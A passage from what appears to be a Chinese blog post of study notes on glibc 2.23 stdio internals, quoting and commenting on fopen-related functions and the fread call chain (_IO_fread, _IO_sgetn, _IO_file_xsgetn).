-1)</p><p>判断文件是否已经打开是则返回0</p></li><li><p>处理文件模式并写入结构体</p></li><li><p>调用_IO_file_open打开文件</p></li><li><p>如果打开成功则进行一（mei）系（kan）列（dong）设定</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_FILE *<br>_IO_new_file_fopen (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode,<br>    <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> oflags = <span class="hljs-number">0</span>, omode;<br>  <span class="hljs-type">int</span> read_write;<br>  <span class="hljs-type">int</span> oprot = <span class="hljs-number">0666</span>;<br>  <span class="hljs-type">int</span> i;<br>  _IO_FILE *result;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cs;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *last_recognized;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//步骤一：判断文件是否已经打开</span><br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//步骤二：处理文件模式并写入_IO_FILE结构体</span><br>  <span class="hljs-keyword">switch</span> (*mode)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>      omode = O_RDONLY;<br>      read_write = _IO_NO_WRITES;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_TRUNC;<br>      read_write = _IO_NO_READS;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_APPEND;<br>      read_write = _IO_NO_READS|_IO_IS_APPENDING;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">7</span>; ++i)<br>    &#123;<br>      <span class="hljs-keyword">switch</span> (*++mode)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\0&#x27;</span>:<br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>  omode = O_RDWR;<br>  read_write &amp;= _IO_IS_APPENDING;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>  oflags |= O_EXCL;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> O_CLOEXEC</span><br>  oflags |= O_CLOEXEC;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br>  <span class="hljs-comment">/* Ignore.  */</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br><br><span class="hljs-comment">//步骤三：调用_IO_file_opwn打开文件</span><br>  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,<br>  is32not64);<br><br><span class="hljs-comment">//步骤四：如果打开成功则进行一（mei）系（kan）列（dong）设定</span><br>  <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __ASSUME_O_CLOEXEC</span><br>      <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_CLOEXEC) != <span class="hljs-number">0</span> &amp;&amp; __have_o_cloexec &lt;= <span class="hljs-number">0</span>)<br>&#123;<br>  <span class="hljs-type">int</span> fd = _IO_fileno (fp);<br>  <span class="hljs-keyword">if</span> (__have_o_cloexec == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> flags = __fcntl (fd, F_GETFD);<br>      __have_o_cloexec = (flags &amp; FD_CLOEXEC) == <span class="hljs-number">0</span> ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (__have_o_cloexec &lt; <span class="hljs-number">0</span>)<br>    __fcntl (fd, F_SETFD, FD_CLOEXEC);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Test whether the mode string specifies the conversion.  */</span><br>      cs = <span class="hljs-built_in">strstr</span> (last_recognized + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;,ccs=&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-comment">/* Yep.  Load the appropriate conversions and set the orientation</span><br><span class="hljs-comment">     to wide.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gconv_fcts</span> <span class="hljs-title">fcts</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span>;</span><br>  <span class="hljs-type">char</span> *endp = __strchrnul (cs + <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;,&#x27;</span>);<br>  <span class="hljs-type">char</span> *ccs = <span class="hljs-built_in">malloc</span> (endp - (cs + <span class="hljs-number">5</span>) + <span class="hljs-number">3</span>);<br><br>  <span class="hljs-keyword">if</span> (ccs == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> malloc_err = errno;  <span class="hljs-comment">/* Whatever malloc failed with.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      __set_errno (malloc_err);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  *((<span class="hljs-type">char</span> *) __mempcpy (ccs, cs + <span class="hljs-number">5</span>, endp - (cs + <span class="hljs-number">5</span>))) = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  strip (ccs, ccs);<br><br>  <span class="hljs-keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span><br>   ? upstr (ccs, cs + <span class="hljs-number">5</span>) : ccs) != <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Something went wrong, we cannot load the conversion modules.</span><br><span class="hljs-comment"> This means we cannot proceed since the user explicitly asked</span><br><span class="hljs-comment"> for these.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      <span class="hljs-built_in">free</span> (ccs);<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-built_in">free</span> (ccs);<br><br>  assert (fcts.towc_nsteps == <span class="hljs-number">1</span>);<br>  assert (fcts.tomb_nsteps == <span class="hljs-number">1</span>);<br><br>  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;<br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;<br><br>  <span class="hljs-comment">/* Clear the state.  We start all over again.  */</span><br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br><br>  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;<br><br>  <span class="hljs-comment">/* The functions are always the same.  */</span><br>  *cc = __libio_codecvt;<br><br>  cc-&gt;__cd_in.__cd.__nsteps = fcts.towc_nsteps;<br>  cc-&gt;__cd_in.__cd.__steps = fcts.towc;<br><br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__flags = __GCONV_IS_LAST;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  cc-&gt;__cd_out.__cd.__nsteps = fcts.tomb_nsteps;<br>  cc-&gt;__cd_out.__cd.__steps = fcts.tomb;<br><br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__flags<br>    = __GCONV_IS_LAST | __GCONV_TRANSLIT;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__statep =<br>    &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  <span class="hljs-comment">/* From now on use the wide character callback functions.  */</span><br>  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;<br><br>  <span class="hljs-comment">/* Set the mode now.  */</span><br>  result-&gt;_mode = <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_FILE *<br>_IO_file_open (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> posix_mode, <span class="hljs-type">int</span> prot,<br>       <span class="hljs-type">int</span> read_write, <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> fdesc;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))<br>    fdesc = open_not_cancel (filename,<br>     posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">else</span><br>    fdesc = open (filename, posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//调用系统调用打开文件</span><br>  fdesc = open (filename, posix_mode, prot);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (fdesc &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//将文件描述符赋值给_fileno字段</span><br>  fp-&gt;_fileno = fdesc;<br><span class="hljs-comment">//flag字段设置</span><br>  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);<br>  <span class="hljs-comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span><br><span class="hljs-comment">     update the offset cache though, since the file handle is not active.  */</span><br><span class="hljs-comment">//对于追加模式，将文件偏移量发送到文件末尾</span><br><span class="hljs-comment">//但不更新偏移缓存，因为文件句柄未激活（百度翻译）</span><br>  <span class="hljs-keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))<br>      == (_IO_IS_APPENDING | _IO_NO_READS))<br>    &#123;<br>      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="hljs-number">0</span>, _IO_seek_end);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)<br>&#123;<br>  close_not_cancel (fdesc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>    &#125;<br><span class="hljs-comment">//再次调用_IO_link_in确保文件结构体链入</span><br>  _IO_link_in ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fopen-maybe-mmap"><a href="#fopen-maybe-mmap" class="headerlink" title="__fopen_maybe_mmap"></a>__fopen_maybe_mmap</h2><p>当有_G_HAVE_MMAP定义时使用，根据读写模式决定操作方式？没看懂。最终返回_IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>__fopen_maybe_mmap (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br><span class="hljs-comment">//如果文件结构体已经链入</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> **<span class="hljs-title">f</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br><span class="hljs-comment">//如果_IO_list_all为null，则不做任何操作</span><br>;<br><span class="hljs-comment">//如果fp就是头节点，直接摘下</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>&#123;<br>  _IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br><span class="hljs-comment">//递增_IO_list_all单链表更改次数</span><br>  ++_IO_list_all_stamp;<br>&#125;<br>      <span class="hljs-keyword">else</span><br><span class="hljs-comment">//如果不是头节点则遍历单链表搜索并摘下fd</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (_IO_FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      ++_IO_list_all_stamp;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//改变_IO_FILE的flag中表示连接的标志位</span><br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><p>流程图如下：</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fread.jpg" class title="fread"><p>执行fread函数时实际上执行的是_IO_fread函数，_IO_fread函数又调用了_IO_sgetn函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofread.c</span><br><br>_IO_size_t<br>_IO_fread (<span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t bytes_requested = size * count;<br>  _IO_size_t bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>_IO_sgetn函数又调用了_IO_XSGETN函数，实际上就是跳转表中的__xsgetn函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br>_IO_size_t<br>_IO_sgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-comment">/* FIXME handle putback buffer here! */</span><br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSGETN(FP,DATA,N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></code></pre></td></tr></table></figure><p>_IO_file_xsgetn执行步骤如下：</p><ul><li>如果缓冲区为空调用_IO_doallocbuf分配缓冲区</li><li>如果want&lt;&#x3D;have则读入want个字节并将want清零，否则执行以下步骤</li><li>如果还有字节剩余，则读入剩余have字节</li><li>如果存在backup则调用_IO_switch_to_main_get_area调用backup</li><li>如果缓冲区容量大于需求则调用__underflow向缓冲区中读入</li><li>将所有读写相关指针指向缓冲区基址</li><li>计算count，直接从文件中读取count字节</li><li>错误处理</li><li>调整文件偏移<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 